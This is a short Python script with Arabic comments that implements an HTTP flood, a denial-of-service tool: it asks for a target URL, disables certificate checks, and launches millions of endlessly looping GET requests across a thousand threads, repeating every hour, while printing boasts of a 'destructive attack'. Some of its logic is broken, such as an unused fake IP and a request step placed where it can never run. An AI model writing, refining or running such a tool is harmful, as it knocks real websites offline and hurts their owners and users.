import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

def attack(url):
    while True:
        try:
            response = session.get(url, headers=headers)
            print(f"🚀🚀🚀 الهجوم جارٍ على {url}!")
        except Exception as e:
            print(f"💥💥💥 خطأ فادح: {e}")

def start_attack(url):
    # استخدام ThreadPoolExecutor لتحسين الأداء
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for _ in range(5000000):
            executor.submit(attack, url)

    # الطلب الأولي خارج الهجمات
    try:
        response = session.get(url, headers=headers)
        print(f"🔥🔥🔥 الرد الأولي:\n{response.text}")
    except Exception as e:
        print(f"💥💥💥 خطأ أثناء الطلب الأولي: {e}")

url = input("🎯 أدخل رابط الهدف: ")

print("💣💣💣 بدء الهجوم المدمر بشكل مستمر على مدار 24 ساعة 💣💣💣")

while True:
    start_attack(url)
    time.sleep(3600)  # انتظار ساعة قبل تكرار الهجوم
